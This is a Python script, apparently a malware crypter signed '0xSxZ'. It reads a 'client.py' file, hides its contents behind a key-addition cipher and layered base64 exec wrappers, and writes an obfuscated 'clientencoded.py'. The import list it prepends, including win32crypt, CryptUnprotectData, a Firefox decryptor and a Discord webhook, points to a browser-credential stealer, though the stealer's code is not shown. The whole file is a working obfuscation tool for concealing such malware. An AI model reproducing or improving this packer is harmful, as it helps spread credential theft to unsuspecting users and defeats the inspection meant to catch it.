import uuid
#from Crypto.Cipher import AES
import base64
import hashlib

hashfile = "y"

salt = "0xSxZ"

def transcrireCle(cle):
	return "".join([str(ord(elt)) for elt in cle])

chiffre = []
hasher = ""
def chiffrer(cle, msg):
	cle = transcrireCle(cle)
	chiffre = []
	message = msg

	for elt in message:
		chiffre.append(ord(elt))


	for i in range(len(chiffre)):
		pos_cle = i % len(cle)
		chiffre[i] += int(cle[pos_cle])


	crypt = ""
	for elt in chiffre:
		try:
			crypt += chr(elt)
		except UnicodeEncodeError:
			crypt += "x"
	return chiffre
def Getchiffrer(cle, msg):
	cle = transcrireCle(cle)
	chiffre = []
	message = msg

	for elt in message:
		chiffre.append(ord(elt))


	for i in range(len(chiffre)):
		pos_cle = i % len(cle)
		chiffre[i] += int(cle[pos_cle])


	crypt = ""
	for elt in chiffre:
		try:
			crypt += chr(elt)
		except UnicodeEncodeError:
			crypt += "x"
	return crypt

if hashfile == "y":
	chiffre = []
	fille = open("client.py", "r").read()
	chiffre = str(chiffrer("0xSxZ", fille))
	part1 = """
def dechiffrer():
	message = ""
	cle = transcrireCle(""" + '"' + salt + '"' +""")
	# parcours du tableau chiffre :
	chiffre = """ + str(chiffre)+"""
	for i in range(len(chiffre)):
		# on applique le chiffrement à l'envers
		chiffre[i] -= int(cle[i % len(cle)])
		# on retrouve le caractère avec chr()
		message += chr(chiffre[i])
	return message
exec(dechiffrer())
"""
	part2 = base64.b64encode(("""def transcrireCle(cle):
	return "".join([str(ord(elt)) for elt in cle])""").encode()).decode()
	#exec(base64.b64decode("aW1wb3J0IG9zCmZyb20gZGF0ZXRpbWUgaW1wb3J0IGRhdGV0aW1lLCB0aW1lZGVsdGEKZnJvbSBvcyBpbXBvcnQgZ2V0ZW52LCBnZXRsb2dpbiwgbGlzdGRpcgpmcm9tIHNodXRpbCBpbXBvcnQgY29weWZpbGUKaW1wb3J0IHNxbGl0ZTMKZnJvbSBkaXNjb3JkX3dlYmhvb2sgaW1wb3J0IERpc2NvcmRXZWJob29rLCBEaXNjb3JkRW1iZWQKaW1wb3J0IHdpbjMyY3J5cHQKaW1wb3J0IGNvZGVjcwppbXBvcnQgd2luMzJjcnlwdAppbXBvcnQgc2h1dGlsCmltcG9ydCBjb21tYW5kCmltcG9ydCBzb2NrZXQKaW1wb3J0IGhhc2hsaWIsIHN5cywgdGltZQppbXBvcnQgdGltZQppbXBvcnQgcmFuZG9tCmltcG9ydCB0aHJlYWRpbmcKaW1wb3J0IHJlCmltcG9ydCBqc29uCmltcG9ydCB1dWlkCmltcG9ydCB0ZXh0d3JhcApmcm9tIGdsb2IgaW1wb3J0IGdsb2IKaW1wb3J0IEZpcmVGb3hEZWNyeXB0CmltcG9ydCByZXF1ZXN0cwpmcm9tIHN0YXJ0dXAgaW1wb3J0IHN0YXJ0dXAKZnJvbSB0a2ludGVyIGltcG9ydCBtZXNzYWdlYm94CmltcG9ydCBkaXNjb3JkCmltcG9ydCBzeXMKaW1wb3J0IGJhc2U2NApmcm9tIGJhc2U2NCBpbXBvcnQgYjY0ZGVjb2RlCmZyb20gQ3J5cHRvLkNpcGhlciBpbXBvcnQgQUVTCmZyb20gd2luMzJjcnlwdCBpbXBvcnQgQ3J5cHRVbnByb3RlY3REYXRhCmZyb20ganNvbiBpbXBvcnQgbG9hZHMKZnJvbSByZWdleCBpbXBvcnQgZmluZGFsbAppbXBvcnQgcGxhdGZvcm0KZnJvbSBodHRwLnNlcnZlciBpbXBvcnQgQmFzZUhUVFBSZXF1ZXN0SGFuZGxlciwgSFRUUFNlcnZlcgppbXBvcnQgdGltZQppbXBvcnQgY29kZWNzCmltcG9ydCBvcwpmcm9tIGh0dHAuc2VydmVyIGltcG9ydCBIVFRQU2VydmVyLCBDR0lIVFRQUmVxdWVzdEhhbmRsZXIKaW1wb3J0IHRraW50ZXIgYXMgdGs="))


	fille ="""import os
from datetime import datetime, timedelta
from os import getenv, getlogin, listdir
from shutil import copyfile
import sqlite3
from discord_webhook import DiscordWebhook, DiscordEmbed
import win32crypt
import codecs
import win32crypt
import shutil
import command
import socket
import time
import random
import threading
import re
import json
import uuid
import textwrap
from glob import glob
import FireFoxDecrypt
import requests
import tkinter
import sys
import base64
from base64 import b64decode
from Crypto.Cipher import AES
from json import loads
from regex import findall
import platform
from http.server import BaseHTTPRequestHandler, HTTPServer
import time
import codecs
import os
from http.server import HTTPServer, CGIHTTPRequestHandler
import tkinter as tk
"""+ "import base64\nMadeBy0xSxZ = " + '"' +base64.b64encode(str("""
import base64
SxZ = """ + '"' + part2 + '"' + """

exec(base64.b64decode(SxZ))
h4x0r = """ + '"'  + base64.b64encode(part1.encode()).decode() +  '"' + """
exec(base64.b64decode(h4x0r).decode())
Made_By_0xSxZ = """ +'"'
+ part2 + '"'+"""\n\n"""+ """
exec(base64.b64decode(Made_By_0xSxZ).decode())
""").encode()).decode()+ '"' + "\nexec(base64.b64decode(MadeBy0xSxZ))"
	open("clientencoded.py", "x").write(fille.replace("b'", "").replace("'", ""))

print("[.] Created clientencoded.py .")